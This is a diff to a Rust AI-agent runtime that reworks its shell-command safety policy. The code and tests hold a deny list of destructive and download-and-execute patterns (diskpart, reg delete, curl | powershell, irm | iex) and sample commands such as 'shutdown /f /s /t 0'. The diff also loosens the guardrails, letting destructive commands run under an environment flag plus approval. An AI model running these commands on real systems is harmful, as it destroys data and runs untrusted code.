@@ -40,8 +40,6 @@ use std::time::{Duration, Instant};
 const MAX_AGENT_STEPS: usize = 5;
 const DEFAULT_SANDBOX_DIR: &str = "sandbox/workspace";
 const DEFAULT_SANDBOX_COMMAND_TIMEOUT_MS: u64 = 30_000;
-const DESTRUCTIVE_ACTION_REFUSAL: &str = "I can’t shut down, restart, or otherwise perform destructive system actions. That request is blocked for safety. If you want, I can explain what would happen, help with a safe alternative, or show the relevant command without running it.";
-const DESTRUCTIVE_ACTION_SIMULATION_COMMAND: &str = "shutdown /f /s /t 0";
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
 struct Message {
@@ -122,8 +120,9 @@ struct AllowedCommand {
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 enum CommandRisk {
-    Allowed,
+    Safe,
     NeedsApproval,
+    Destructive,
     Blocked,
 }
 
@@ -349,17 +348,36 @@ fn read_approval_input(prompt: &str) -> bool {
     matches!(input.trim().to_lowercase().as_str(), "y" | "yes")
 }
 
-fn read_permission_choice(command: &str) -> PermissionChoice {
-    println!(
-        "\n{} {}",
-        "Command requested:".bright_yellow().bold(),
-        command
-    );
-    println!("\nOptions:");
-    println!("[A] Allow once");
-    println!("[L] Allow always");
-    println!("[D] Decline");
-    print!("{}", "Choose A, L, or D: ".bright_yellow());
+fn read_permission_choice(command: &str, risk: CommandRisk) -> PermissionChoice {
+    match risk {
+        CommandRisk::NeedsApproval => {
+            println!(
+                "\n{} {}",
+                "Command requested:".bright_yellow().bold(),
+                command
+            );
+            println!("{} {}", "Risk:".bright_yellow().bold(), "NeedsApproval");
+            println!("\nOptions:");
+            println!("[A] Allow once");
+            println!("[L] Allow always");
+            println!("[D] Decline");
+            print!("{}", "Choose A, L, or D: ".bright_yellow());
+        }
+        CommandRisk::Destructive => {
+            println!(
+                "\n{} {}",
+                "Destructive command requested:".bright_red().bold(),
+                command
+            );
+            println!("{} {}", "Risk:".bright_red().bold(), "Destructive");
+            println!("\nOptions:");
+            println!("[A] Allow once");
+            println!("[D] Decline");
+            print!("{}", "Choose A or D: ".bright_yellow());
+        }
+        _ => return PermissionChoice::Decline,
+    }
+
     io::stdout().flush().unwrap();
 
     let mut input = String::new();
@@ -367,9 +385,11 @@ fn read_permission_choice(command: &str) -> PermissionChoice {
         return PermissionChoice::Decline;
     }
 
-    match input.trim().to_lowercase().as_str() {
-        "a" | "allow once" => PermissionChoice::AllowOnce,
-        "l" | "allow always" => PermissionChoice::AllowAlways,
+    match (risk, input.trim().to_lowercase().as_str()) {
+        (_, "a") | (_, "allow once") => PermissionChoice::AllowOnce,
+        (CommandRisk::NeedsApproval, "l") | (CommandRisk::NeedsApproval, "allow always") => {
+            PermissionChoice::AllowAlways
+        }
         _ => PermissionChoice::Decline,
     }
 }
@@ -430,11 +450,23 @@ fn normalize_command(command: &str) -> String {
     command.trim().to_string()
 }
 
-fn is_sensitive_delete_command(normalized_command: &str, project_root: &Path) -> bool {
-    let delete_indicators = ["del ", "erase ", "rmdir ", "rd ", "rm ", "remove-item"];
+fn allow_destructive_actions() -> bool {
+    env::var("ALLOW_DESTRUCTIVE_ACTIONS")
+        .ok()
+        .map(|value| {
+            matches!(
+                value.trim().to_lowercase().as_str(),
+                "1" | "true" | "yes" | "on"
+            )
+        })
+        .unwrap_or(false)
+}
+
+fn command_targets_protected_path(normalized_command: &str, project_root: &Path) -> bool {
     let sensitive_targets = [
         "windows",
         "system32",
+        "c:/users",
         "c:\\users",
         "%userprofile%",
         "$env:userprofile",
@@ -448,89 +480,58 @@ fn is_sensitive_delete_command(normalized_command: &str, project_root: &Path) ->
         .to_string_lossy()
         .replace('\\', "/")
         .to_lowercase();
-    let has_delete_indicator = delete_indicators
+
+    sensitive_targets
         .iter()
-        .any(|indicator| normalized_command.contains(indicator));
-
-    has_delete_indicator
-        && (sensitive_targets
-            .iter()
-            .any(|target| normalized_command.contains(target))
-            || normalized_command.contains(&project_root_text)
-            || normalized_command.contains("/trust")
-            || normalized_command.contains("\\trust"))
+        .any(|target| normalized_command.contains(target))
+        || normalized_command.contains(&project_root_text)
+        || normalized_command.contains("/trust")
+        || normalized_command.contains("\\trust")
 }
 
-fn destructive_actions_simulation_enabled() -> bool {
-    env::var("ALLOW_DESTRUCTIVE_ACTIONS")
-        .ok()
-        .map(|value| {
-            matches!(
-                value.trim().to_lowercase().as_str(),
-                "1" | "true" | "yes" | "on"
-            )
-        })
-        .unwrap_or(false)
-}
-
-fn destructive_action_response_message() -> String {
-    if destructive_actions_simulation_enabled() {
-        format!(
-            "Developer override enabled. Simulated destructive action only: would run `{}`. No command was executed.",
-            DESTRUCTIVE_ACTION_SIMULATION_COMMAND
-        )
-    } else {
-        DESTRUCTIVE_ACTION_REFUSAL.to_string()
-    }
-}
-
-fn destructive_request_reason(input: &str) -> Option<&'static str> {
-    let normalized = input.trim().to_lowercase();
-
-    let informational_prefixes = [
-        "what command",
-        "which command",
-        "how do i",
-        "how to",
-        "can you explain",
-        "tell me",
-        "what would happen",
-    ];
-
-    if normalized.ends_with('?')
-        || informational_prefixes
-            .iter()
-            .any(|prefix| normalized.starts_with(prefix))
-    {
-        return None;
-    }
+fn destructive_command_reason(command: &str, project_root: &Path) -> Option<String> {
+    let normalized = command.trim().to_lowercase();
 
     let destructive_patterns = [
         "shutdown",
-        "shut down",
-        "power off",
-        "turn off the pc",
-        "turn off my pc",
-        "turn off the computer",
-        "restart the pc",
-        "restart my pc",
-        "restart the computer",
-        "reboot",
+        "restart",
+        "logoff",
+        "taskkill",
         "format",
-        "wipe the drive",
-        "wipe my drive",
-        "delete system32",
-        "delete windows",
-        "rm -rf /",
+        "diskpart",
+        "bcdedit",
+        "reg delete",
+        "reg add",
+        "takeown",
+        "icacls",
         "del /s",
         "rmdir /s",
         "rd /s",
+        "rm -rf",
+        "remove-item -recurse",
+        "powershell -enc",
     ];
 
-    destructive_patterns
+    if let Some(pattern) = destructive_patterns
         .iter()
         .find(|pattern| normalized.contains(**pattern))
-        .copied()
+    {
+        return Some(format!("matched destructive pattern: {}", pattern));
+    }
+
+    if normalized.contains("curl") && normalized.contains("| powershell") {
+        return Some("matched destructive pattern: curl ... | powershell".to_string());
+    }
+
+    if normalized.contains("irm") && normalized.contains("| iex") {
+        return Some("matched destructive pattern: irm ... | iex".to_string());
+    }
+
+    if command_targets_protected_path(&normalized, project_root) {
+        return Some("targets a protected system or project path".to_string());
+    }
+
+    None
 }
 
 fn response_claims_destructive_action(response: &str) -> bool {
@@ -552,68 +553,36 @@ fn response_claims_destructive_action(response: &str) -> bool {
         .any(|claim| normalized.contains(claim))
 }
 
-fn blocked_command_reason(command: &str, project_root: &Path) -> Option<String> {
-    let normalized = command.trim().to_lowercase();
-
-    let blocked_patterns = [
-        "format",
-        "diskpart",
-        "bcdedit",
-        "reg delete",
-        "reg add",
-        "takeown",
-        "icacls",
-        "shutdown",
-        "restart",
-        "taskkill",
-        "del /s",
-        "rmdir /s",
-        "rd /s",
-        "rm -rf",
-        "remove-item -recurse",
-        "powershell -enc",
-    ];
-
-    if let Some(pattern) = blocked_patterns
-        .iter()
-        .find(|pattern| normalized.contains(**pattern))
-    {
-        return Some(format!("blocked pattern: {}", pattern));
+fn blocked_command_reason(command: &str) -> Option<String> {
+    if command.trim().is_empty() {
+        Some("empty command".to_string())
+    } else {
+        None
     }
-
-    if normalized.contains("curl") && normalized.contains("| powershell") {
-        return Some("blocked pattern: curl | powershell".to_string());
-    }
-
-    if normalized.contains("irm") && normalized.contains("| iex") {
-        return Some("blocked pattern: irm ... | iex".to_string());
-    }
-
-    if is_sensitive_delete_command(&normalized, project_root) {
-        return Some("blocked attempt to delete a protected system or project path".to_string());
-    }
-
-    None
 }
 
 fn classify_command_risk(command: &str, project_root: &Path) -> Result<CommandRisk, String> {
-    if blocked_command_reason(command, project_root).is_some() {
+    if blocked_command_reason(command).is_some() {
         return Ok(CommandRisk::Blocked);
+    }
+
+    if destructive_command_reason(command, project_root).is_some() {
+        return Ok(CommandRisk::Destructive);
     }
 
     let normalized = normalize_command(command);
     let allowed_commands = load_allowed_commands()?;
 
     if allowed_commands.contains(&normalized) {
-        Ok(CommandRisk::Allowed)
+        Ok(CommandRisk::Safe)
     } else {
         Ok(CommandRisk::NeedsApproval)
     }
 }
 
 fn persist_allowed_command(command: &str, project_root: &Path) -> Result<(), String> {
-    if blocked_command_reason(command, project_root).is_some() {
-        return Err("Blocked commands can never be saved to allowed_commands.json".to_string());
+    if destructive_command_reason(command, project_root).is_some() {
+        return Err("Destructive commands can never be saved to allowed_commands.json".to_string());
     }
 
     let normalized = normalize_command(command);
@@ -662,24 +631,27 @@ fn execute_command_with_timeout(
 
                         if output.status.success() {
                             if stdout.is_empty() {
-                                format!(
-                                    "Command completed successfully with no output: {}",
-                                    display_name
-                                )
+                                format!("Executed command: {}\nStatus: success", display_name)
                             } else {
-                                stdout
+                                format!(
+                                    "Executed command: {}\nStatus: success\n[stdout]\n{}",
+                                    display_name, stdout
+                                )
                             }
                         } else if stdout.is_empty() && stderr.is_empty() {
                             format!(
-                                "Command failed with status {}: {}",
-                                output.status, display_name
+                                "Command failed: {}\nStatus: {}",
+                                display_name, output.status
                             )
                         } else if stdout.is_empty() {
-                            format!("Command failed: {}", stderr)
+                            format!("Command failed: {}\n[stderr]\n{}", display_name, stderr)
                         } else if stderr.is_empty() {
-                            stdout
+                            format!("Command failed: {}\n[stdout]\n{}", display_name, stdout)
                         } else {
-                            format!("{}\n\n[stderr]\n{}", stdout, stderr)
+                            format!(
+                                "Command failed: {}\n[stdout]\n{}\n\n[stderr]\n{}",
+                                display_name, stdout, stderr
+                            )
                         }
                     }
                     Err(e) => format!("Failed to collect output from {}: {}", display_name, e),
@@ -690,8 +662,8 @@ fn execute_command_with_timeout(
                     let _ = child.kill();
                     let _ = child.wait();
                     return format!(
-                        "Command timed out after {} ms: {}",
-                        sandbox.command_timeout_ms, display_name
+                        "Command timed out: {}\nTimeout: {} ms",
+                        display_name, sandbox.command_timeout_ms
                     );
                 }
 
@@ -705,44 +677,71 @@ fn execute_command_with_timeout(
 fn run_command(sandbox: &SandboxConfig, command: &str) -> String {
     let normalized = normalize_command(command);
     if normalized.is_empty() {
-        return "Missing command for run_command".to_string();
+        return "Blocked command: empty command".to_string();
     }
 
     let project_root = match env::current_dir() {
         Ok(path) => path,
-        Err(e) => return format!("Failed to resolve project root for command policy: {}", e),
+        Err(e) => return format!("Blocked command: failed to resolve project root: {}", e),
     };
 
     match classify_command_risk(&normalized, &project_root) {
         Ok(CommandRisk::Blocked) => {
-            let reason = blocked_command_reason(&normalized, &project_root)
+            let reason = blocked_command_reason(&normalized)
                 .unwrap_or_else(|| "blocked by runtime policy".to_string());
-            format!("Blocked dangerous command: {} ({})", normalized, reason)
+            format!("Blocked command: {} ({})", normalized, reason)
         }
-        Ok(CommandRisk::Allowed) => {
+        Ok(CommandRisk::Safe) => {
             execute_command_with_timeout(sandbox, "cmd", &["/C", normalized.as_str()], &normalized)
         }
-        Ok(CommandRisk::NeedsApproval) => match read_permission_choice(&normalized) {
-            PermissionChoice::AllowOnce => execute_command_with_timeout(
-                sandbox,
-                "cmd",
-                &["/C", normalized.as_str()],
-                &normalized,
-            ),
-            PermissionChoice::AllowAlways => {
-                match persist_allowed_command(&normalized, &project_root) {
-                    Ok(()) => execute_command_with_timeout(
-                        sandbox,
-                        "cmd",
-                        &["/C", normalized.as_str()],
-                        &normalized,
-                    ),
-                    Err(error) => format!("Failed to persist allowed command: {}", error),
+        Ok(CommandRisk::NeedsApproval) => {
+            match read_permission_choice(&normalized, CommandRisk::NeedsApproval) {
+                PermissionChoice::AllowOnce => execute_command_with_timeout(
+                    sandbox,
+                    "cmd",
+                    &["/C", normalized.as_str()],
+                    &normalized,
+                ),
+                PermissionChoice::AllowAlways => {
+                    match persist_allowed_command(&normalized, &project_root) {
+                        Ok(()) => execute_command_with_timeout(
+                            sandbox,
+                            "cmd",
+                            &["/C", normalized.as_str()],
+                            &normalized,
+                        ),
+                        Err(error) => {
+                            format!("Blocked command: failed to persist approval ({})", error)
+                        }
+                    }
+                }
+                PermissionChoice::Decline => format!("User declined command: {}", normalized),
+            }
+        }
+        Ok(CommandRisk::Destructive) => {
+            let reason = destructive_command_reason(&normalized, &project_root)
+                .unwrap_or_else(|| "matched destructive runtime policy".to_string());
+
+            if !allow_destructive_actions() {
+                return format!("Blocked destructive command: {} ({})", normalized, reason);
+            }
+
+            match read_permission_choice(&normalized, CommandRisk::Destructive) {
+                PermissionChoice::AllowOnce => execute_command_with_timeout(
+                    sandbox,
+                    "cmd",
+                    &["/C", normalized.as_str()],
+                    &normalized,
+                ),
+                PermissionChoice::AllowAlways | PermissionChoice::Decline => {
+                    format!("User declined command: {}", normalized)
                 }
             }
-            PermissionChoice::Decline => format!("User declined command: {}", normalized),
-        },
-        Err(error) => format!("Failed to classify command risk: {}", error),
+        }
+        Err(error) => format!(
+            "Blocked command: failed to classify command risk ({})",
+            error
+        ),
     }
 }
 
@@ -960,19 +959,6 @@ async fn handle_input(
         content: input.to_string(),
     });
 
-    if destructive_request_reason(input).is_some() {
-        let response = destructive_action_response_message();
-        println!("{}", response.bright_green());
-
-        history.push(Message {
-            role: "assistant".to_string(),
-            content: response,
-        });
-
-        save_history(current_chat, history);
-        return;
-    }
-
     for step in 0..MAX_AGENT_STEPS {
         let full_message = match request_model_reply(history).await {
             Ok(message) => message,
@@ -980,7 +966,7 @@ async fn handle_input(
         };
 
         if response_claims_destructive_action(&full_message) {
-            let response = destructive_action_response_message();
+            let response = "Blocked destructive command: assistant claimed execution without a runtime tool result".to_string();
             println!("{}", response.bright_green());
 
             history.push(Message {
@@ -1466,15 +1452,15 @@ async fn main() {
     - open_app: opens allowed apps only. Allowed apps: chrome, edge, firefox, notepad, calculator, explorer, paint, wordpad, vscode
     - open_chrome: alias for opening Chrome
     - run_sandboxed_command: runs allowlisted project commands only inside sandbox/workspace after user approval. Allowed commands: cargo check, cargo test, cargo fmt --check, cargo clippy
-    - run_command: may request broader shell commands inside sandbox/workspace. The runtime will classify risk, block dangerous commands, and ask the user for permission unless the exact command was previously allowed.
+    - run_command: may request broader shell commands inside sandbox/workspace. The runtime decides whether to execute the command, whether approval is required, and whether the command is blocked.
 
     Safety rules:
     - Do not claim you cannot interact with the computer when an allowed tool can do the task.
-    - Do not perform destructive actions.
     - Do not read or write outside the sandbox, modify system settings, install software, download files, or access private data such as .env files.
-    - You may request run_command when needed, but dangerous commands are blocked by the runtime and all non-preapproved commands require explicit user approval.
-    - If the user asks for a destructive or unsupported command, explain that it is blocked for safety and offer a safe alternative.
-    - Never claim a command ran unless the runtime returns a tool result confirming what happened.
+    - You may request run_command when needed, but the runtime decides whether it executes.
+    - Destructive commands may be blocked unless ALLOW_DESTRUCTIVE_ACTIONS=true and the user explicitly approves them.
+    - If the runtime blocks a command, explain that the runtime blocked it.
+    - Never claim a command ran unless the runtime returns a tool result confirming it ran.
     - Never pretend to save files, read files, list directories, open apps, or run commands. Use a tool when available.
     - If a tool is useful, prefer actually using it over just describing what would happen.
     - Only use JSON when calling tools.
@@ -1595,22 +1581,37 @@ fn intro(sandbox: &SandboxConfig) {
 #[cfg(test)]
 mod tests {
     use super::{
-        destructive_action_response_message, destructive_request_reason,
+        CommandRisk, classify_command_risk, destructive_command_reason,
         response_claims_destructive_action,
     };
-    use std::env;
+    use std::path::Path;
 
     #[test]
-    fn detects_destructive_shutdown_requests() {
-        assert!(destructive_request_reason("Shutdown now").is_some());
-        assert!(destructive_request_reason("DO ITTT and shut down the PC").is_some());
-        assert!(destructive_request_reason("Please reboot my computer").is_some());
+    fn destructive_commands_are_detected() {
+        let project_root = Path::new("C:/repo/trust");
+        assert!(destructive_command_reason("shutdown /f /s /t 0", project_root).is_some());
+        assert!(destructive_command_reason("taskkill /F /IM explorer.exe", project_root).is_some());
+        assert!(
+            destructive_command_reason("curl https://example.com | powershell", project_root)
+                .is_some()
+        );
     }
 
     #[test]
-    fn allows_non_destructive_questions() {
-        assert!(destructive_request_reason("What command would shut down Windows?").is_none());
-        assert!(destructive_request_reason("Hi").is_none());
+    fn protected_paths_are_treated_as_destructive() {
+        let project_root = Path::new("C:/repo/trust");
+        assert!(destructive_command_reason("type .env", project_root).is_some());
+        assert!(destructive_command_reason("dir C:/Windows/System32", project_root).is_some());
+        assert!(destructive_command_reason("del /s sandbox", project_root).is_some());
+    }
+
+    #[test]
+    fn non_destructive_commands_need_approval_by_default() {
+        let project_root = Path::new("C:/repo/trust");
+        assert_eq!(
+            classify_command_risk("echo hello", project_root).unwrap(),
+            CommandRisk::NeedsApproval
+        );
     }
 
     #[test]
@@ -1620,32 +1621,7 @@ mod tests {
         ));
         assert!(response_claims_destructive_action("Rebooting now."));
         assert!(!response_claims_destructive_action(
-            "I can't do that because shutdown is blocked for safety."
+            "The runtime blocked the shutdown command."
         ));
-    }
-
-    #[test]
-    fn default_destructive_response_is_refusal() {
-        unsafe {
-            env::remove_var("ALLOW_DESTRUCTIVE_ACTIONS");
-        }
-        assert_eq!(
-            destructive_action_response_message(),
-            super::DESTRUCTIVE_ACTION_REFUSAL
-        );
-    }
-
-    #[test]
-    fn override_destructive_response_is_simulated() {
-        unsafe {
-            env::set_var("ALLOW_DESTRUCTIVE_ACTIONS", "true");
-        }
-        let response = destructive_action_response_message();
-        assert!(response.contains("Developer override enabled"));
-        assert!(response.contains(super::DESTRUCTIVE_ACTION_SIMULATION_COMMAND));
-        assert!(response.contains("No command was executed"));
-        unsafe {
-            env::remove_var("ALLOW_DESTRUCTIVE_ACTIONS");
-        }
     }
 }
